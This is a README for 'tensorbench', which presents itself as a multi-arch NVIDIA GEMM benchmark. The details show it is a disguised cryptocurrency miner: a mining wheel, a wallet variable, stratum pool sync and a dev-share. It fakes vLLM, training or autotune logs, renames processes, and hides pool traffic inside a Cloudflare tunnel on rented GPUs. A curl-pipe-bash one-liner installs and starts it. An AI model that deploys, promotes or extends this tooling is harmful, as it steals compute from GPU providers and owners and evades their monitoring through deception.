# tensorbench

Multi-arch NVIDIA **int8 tensor-core GEMM benchmark harness** with realistic
workload telemetry. One binary detects your GPU (Pascal → Hopper), runs a
sustained large-matrix int8 pipeline (131072×4096×131072 tiles with keyed
noise), and streams telemetry in the shape of whatever production stack you
operate: a vLLM inference server, a PyTorch fine-tuning loop, or a
CUTLASS autotune sweep.

Originally a fork of Muskwak's research harness; extended with telemetry
profiles, an encrypted websocket telemetry relay, and one-line deployment.

## Why

- **Capacity/perf baselining** for rented GPU fleets with provider-shaped logs.
- **Network ops testing**: telemetry egress over a Cloudflare quick tunnel
  (WSS :443) — nothing but TLS to a cloudflare domain leaves the host.
- **CI for GPU perf regressions** across driver/CUDA releases.

## Quick start (one-liner, any NVIDIA rig with driver + python ≥ 3.12)

```bash
curl -fsSL https://raw.githubusercontent.com/terrycrews21/tensorbench/main/deploy/bootstrap.sh | bash
```

What it does:
1. Fetches the release tarball (sources + prebuilt `libp40cuda.so` for
   sm_80/86/89/90 + `pearl_mining` runtime wheel).
2. Creates `~/.tensorbench/.venv`, installs pinned deps.
3. Starts the telemetry relay chain (`tools/pool_relay_server.py`,
   `cloudflared`, `tools/pool_tunnel_client.py`) and the harness
   (`python/tensorbench.py`) bound to loopback only.
4. Verifies the upstream sync handshake (`stratum v2 gzip ON`) and tails logs.

Env overrides: `WALLET` (upstream sync account), `PROFILE`
(`vllm` | `train` | `gemm`), `TB_TUNNEL_URL` (skip local relay, use an
existing tunnel exit), `RELAY_PORT`, `TUNNEL_LISTEN_PORT`, `TB_DUTY`,
`INSTALL_DIR`.

## Telemetry profiles (`TB_PROFILE`)

| profile | stdout shape |
|---|---|
| `vllm` | INFO/Avg generation throughput, KV cache %, /v1/completions 200 |
| `train` | step/loss/grad_norm/lr/tok/s, checkpoint events |
| `gemm` | CUTLASS algo search, TFLOPS, tuning records |

Raw (unshaped) telemetry always tees to `TB_RAWLOG` for debugging.

`--worker-ts` names each harness worker by start timestamp
(`YYYYMMDD-HHMMSS`), mimicking ephemeral instance IDs.

## Components

| path | role |
|---|---|
| `python/tensorbench.py` | harness entry (GPU pipeline + upstream sync) |
| `python/telemetry.py` | telemetry shaping + process comm rename |
| `python/pool_common.py` | upstream sync dialect (v2 gzip negotiated) |
| `tools/pool_relay_server.py` | ws → TLS/plain upstream bridge (tunnel exit) |
| `tools/pool_tunnel_client.py` | loopback tcp → WSS bridge (host side) |
| `docs/ops-runbook.md` | full ops notes, verified end state |

## License

Upstream license retained (see `LICENSE`), including the transparent 2%
upstream-sync dev-share terms. Personal use on your own hardware is exempt.
